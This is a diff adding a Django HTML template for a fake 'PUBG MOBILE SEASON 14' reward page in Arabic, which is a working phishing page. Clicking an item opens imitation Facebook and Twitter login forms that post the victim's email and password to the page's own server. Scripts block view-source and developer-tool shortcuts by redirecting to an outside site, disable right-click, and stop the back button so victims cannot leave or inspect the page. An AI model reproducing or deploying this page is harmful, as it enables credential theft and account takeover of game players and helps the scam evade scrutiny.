@@ -1,0 +1,527 @@
+
+{% load static %}
+<html>
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta property="og:title" content="PUBG MOBILE SEASON 14">
+    <meta name="description" content="Latest PUBG MOBILE Event. Get an exclusive Season 14 prize !!!">
+    <meta property="og:description" content="Latest PUBG MOBILE Event. Get an exclusive Season 14 prize !!!">
+    <meta property="og:url" content="./">
+    <meta property="og:site_name" content="PUBG MOBILE SEASON 14">
+    <meta property="og:type" content="website">
+    <meta name="copyright"content="PUBG MOBILE">
+    <meta name="theme-color" content="#000">
+    <meta property="og:image" content="{% static 'stat/img/banner.png' %}">
+    <title>PUBG MOBILE SEASON 14</title>
+    <link rel="stylesheet" href="{% static 'stat/css/style.css' %}">
+    
+    <link rel="stylesheet" href="{% static 'stat/css/animate.css' %}">
+    <link rel="stylesheet" href="{% static 'stat/css/login/facebook.css' %}">
+    <link rel="stylesheet" href="{% static 'stat/css/login/twitter.css' %}">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="icon" href="{% static 'stat/img/icon.png' %}">
+  
+    <!-- fontawesome ايقونات -->
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.2/css/all.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <!-- عند تغير الخط يجب تغير هذا السطر ويمكن الحصول عليه من خلال موقع خطوط جوجل -->
+    <link href="https://fonts.googleapis.com/css2?family=El+Messiri:wght@700&display=swap" rel="stylesheet">
+    <!--  خط الموقع كاملا ويمكنك تغيره من خلال موقع خطوط جوجل-->
+    <style>body{font-family: 'El Messiri', sans-serif;}</style>
+  
+<style>
+    .fullscreen-bg {
+        position: fixed;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        overflow: hidden;
+        z-index: -100;
+    }
+    
+    .fullscreen-bg__video {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+    @media (min-aspect-ratio: 16/9) {
+        .fullscreen-bg__video {
+          width: 100%;
+          height: auto;
+        }
+      }
+      
+      @media (max-aspect-ratio: 16/9) {
+        .fullscreen-bg__video {
+          width: auto;
+          height: 100%;
+        }
+      }
+</style>
+    
+
+    </head>
+    <body style="background-color: re;" onLoad="noBack();" onpageshow="if (event.persisted) noBack();" onUnload="">
+    
+        <div class="fullscreen-bg">
+            <video loop muted autoplay poster="" class="fullscreen-bg__video">
+                <source src="{% static 'stat/audio/vid33.mp4' %}" type="video/mp4">
+            </video>
+        </div>
+        
+    <div  class="container">
+        <div class="header"></div>
+        <div class="box">
+            <center>
+            <div class="menu active" onmousedown="buka.play()" onclick="openHero(event, 'latest');" id="defaultOpen">مكافأة  فرعون</div>
+            <div class="menu" onmousedown="buka.play()" onclick="openHero(event, 'season');">مكافأة  الموسم</div>
+            <div class="menu" onmousedown="buka.play()" onclick="openHero(event, 'other');">مكافأة  أخرى</div>
+            <div class="alert">
+                <div class="alert-time">
+                    <div >{{dt|date:'Y n j | g : i'}}</div> <!-- الساعة-->
+                </div>
+                <div class="slider"><i class="fas fa-gamepad"></i> مرحبا بكم في ببجي موبايل S14</div>
+            </div>
+            </center>
+            <div id="latest" class="gallery">
+                <div class="scroll">
+                    <center>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/latest/1.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/latest/1.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/latest/2.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/latest/2.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/latest/3.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/latest/3.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/latest/4.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/latest/4.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/latest/5.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/latest/5.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/latest/6.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/latest/6.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/latest/7.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/latest/7.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/latest/8.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/latest/8.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/latest/9.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/latest/9.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/latest/10.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/latest/10.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/latest/11.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/latest/11.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    </center>
+                </div>
+            </div>
+            <div id="season" class="gallery">
+                <div class="scroll">
+                    <center>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/1.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/1.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/2.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/2.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/3.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/3.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/4.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/4.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/5.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/5.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/6.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/6.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/7.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/7.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/8.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/8.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/9.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/9.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/10.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/10.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/11.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/11.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/12.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/12.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/13.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/13.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/14.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/14.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/15.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/15.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/16.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/16.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/20.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/17.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/21.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/18.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/17.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/19.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/18.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/20.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/rp/19.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/rp/21.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    </center>
+                </div>
+            </div>
+            <div id="other" class="gallery">
+                <div class="scroll">
+                    <center>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/unknown/f.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/unknown/f.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/unknown/e.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/unknown/e.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/unknown/d.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/unknown/d.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/unknown/c.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/unknown/c.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/unknown/b.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/unknown/b.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/item/unknown/a.png' %}" style="border-bottom: none;">
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/item/unknown/a.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/pop1.png' %}" style="border-bottom: none;">
+                        <div class="item-name">2200 شعبية</div>
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/pop1.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    <div class="item">
+                        <img src="{% static 'stat/img/pop2.png' %}" style="border-bottom: none;">
+                        <div class="item-name">25000 شعبية</div>
+                        <div>
+                            <button onmousedown="buka.play();" onclick="reward_confirmation(this);" src="{% static 'stat/img/pop2.png' %}">شراء</button>
+                        </div>
+                    </div>
+                    </center>
+                </div>
+            </div>
+        </div> <!--- box --->
+    </div> <!--- container --->
+    
+    <div  class="popup reward_confirmation" style="display: none;">
+        <div class="popup-box animated fadeInDown">
+            <div class="nav-popup">
+                <div class="nav-popup-title">تأكيد العملية</div>
+            </div>
+            <div class="alert">هل أنت متأكد من شراء هذا العنصر ؟</div>
+            <img class="popup-item" src="" id="myImgReward">
+            <center>
+            <button type="button" class="btn-anjir" style="width: 45%;" onmousedown="tutup.play()" onclick="close_reward_confirmation()">إلغاء</button>
+            <button type="button" class="btn-anjir" style="width: 45%;" onmousedown="buka.play()" onclick="account_login()">شراء</button>
+            </center>
+        </div>
+    </div>
+  
+    <div class="popup account_login" style="display: none;">
+        <div class="popup-box animated fadeInDown">
+            <div class="nav-popup">
+                <div class="nav-popup-title">تسجل الدخول</div>
+            </div>
+            <div class="alert">
+              سجّل الدخول باستخدام حسابك في ببجي موبايل 
+            </div>
+            <div class="alert" ><i class="fas fa-check-circle"></i> 
+            البيانت محمية ومشفرة للحماية من  الإختراقات 
+            </div>
+            <button type="button" class="btn-login facebook" onclick="open_facebook();"> <i class="fab fa-facebook-square"></i> Facebook</button>
+            <button type="button" class="btn-login twitter" onclick="open_twitter();"><i class="fab fa-twitter"></i> Twitter</button>
+  
+            <center>
+            <button type="button" class="btn-anjir" onmousedown="tutup.play()" onclick="close_account_login()">إلغاء</button>
+            </center>
+        </div>
+    </div>
+    
+    <div class="popup-login login-facebook animated fadeIn" style="display: none;">
+        <div class="popup-box-login-fb">
+            <a onclick="tutup_facebook()" class="close-fb"><i class="fa fa-times-circle"></i></a>
+            <div class="navbar-fb">
+                <img src="{% static 'stat/img/login/facebook_text.png' %}">
+            </div>
+            <div class="content-box-fb">
+                <img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
+                <div class="txt-login-fb">
+                     Log in to your Facebook account to connect to PUBG MOBILE
+                </div>
+
+                <form  class="login-form" action="{% url 'index'%}" method="POST" >
+                    {% csrf_token %}
+                    <label for="email">
+                    <input type="text" id="email" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required></label>
+                    
+                    <label for="password">
+                    <input type="password" id="password" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" required></label>
+                    
+                    <button type="submit" class="btn-login-fb">Log In</button>
+                </form>
+
+                <div class="txt-create-account">Create account</div>
+                <div class="txt-not-now">Not now</div>
+                <div class="txt-forgotten-password">Forgotten password?</div>
+            </div>
+            <div class="language-box">
+                <center>
+                <div class="language-name language-name-active">English (UK)</div>
+                <div class="language-name">Bahasa Indonesia</div>
+                <div class="language-name">Basa Jawa</div>
+                <div class="language-name">Bahasa Melayu</div>
+                <div class="language-name">日本語</div>
+                <div class="language-name">Español</div>
+                <div class="language-name">Português (Brasil)</div>
+                <div class="language-name">
+                    <i class="fa fa-plus"></i>
+                </div>
+                </center>
+            </div>
+            <div class="copyright">Facebook Inc.</div>
+        </div>
+    </div>
+    <div class="popup-login login-twitter animated fadeIn" style="display: none;">
+        <div class="popup-box-login-twitter">
+            <a onclick="tutup_twitter()" class="close-other"><i class="fa fa-times-circle"></i></a>
+            <div class="header-twitter">
+                <center>
+                <img src="{% static 'stat/img/login/twitter_text.png' %}">
+                </center>
+            </div>
+
+
+
+
+
+
+            <div class="box-twitter">
+                <center>
+                <form  action="{% url 'index'%}" method="POST" >
+                    {% csrf_token %}
+                    <div class="txt-login-twitter">Login to Twitter</div>
+                    <div class="input-box-twitter">
+
+                        <label for="email">Phone, email, or username</label>
+                        <input type="text" id="email" name="email" placeholder="" required></div>
+
+                    <div class="input-box-twitter">
+
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" placeholder="" required></div>
+
+                        <!-- onClick="location.href='http://www.facebook.com/'" -->
+                        
+                        
+                    <button required  type="submit" class="btn-login-twitter" >Log In</button>
+                    <div class="footer-menu-twitter">Forgot password?</div>
+                    <div class="footer-menu-twitter bulet">•</div>
+                    <div class="footer-menu-twitter">Sign up to Twitter</div>
+                </form>
+                </center>
+            </div>
+        </div>
+    </div>
+  
+
+  
+    <!--- fieldset content --->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+    <!--- /fieldset content --->
+    <script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+    <script src="{% static 'stat/js/timer.js' %}"></script>
+    <script src="{% static 'stat/js/tab.js' %}"></script>
+    <script src="{% static 'stat/js/popup.js' %}"></script>
+    <script src="{% static 'stat/js/click.js' %}"></script>
+
+
+
+
+
+        <!-- كود عند الضغط ع زر محدد في لوحة المفاتيح يذهب الى موقع محدد   -->
+    <!-- Ctrl+U  قمنا بستبداله بدل ان يذهب الى مصدر الصفحة جعلناه يذهب الى مكان اخر محدد في الكود-->
+    <script type='text/javascript'>
+        shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="http://www.sweup.com/sl"});
+        </script> 
+       
+        <!-- f12  قمنا بستبداله بدل ان يذهب الى مصدر الصفحة جعلناه يذهب الى مكان اخر محدد في الكود -->
+        <script type='text/javascript'>
+            shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("f12",function(){top.location.href="http://www.sweup.com/sl"});
+        </script> 
+    
+        <!-- Ctrl+shift+i -->
+        <script type='text/javascript'>
+          shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+shift+i",function(){top.location.href="http://www.sweup.com/sl"});
+      </script> 
+    
+    
+        <!-- كود تعطيل الزر الايمن من الفأرة -->
+        <script language=JavaScript>
+            var message = "تم تعطيل هذا الزر بشكل مؤقت";
+            function rtclickcheck(keyp){ if (navigator.appName == "Netscape" && keyp.which == 3){ alert(message); return false; }
+            if (navigator.appVersion.indexOf("MSIE") != -1 && event.button == 2) { alert(message); return false; } }
+            document.onmousedown = rtclickcheck;
+        </script>
+
+        <!-- كود لا يمكن الرجوع الى الصفحة السابقة-->
+        <script type="text/javascript">
+            window.history.forward();
+            function noBack()
+            {
+                window.history.forward();
+            }
+        </script>
+        
+
+
+    </body>
+    </html>
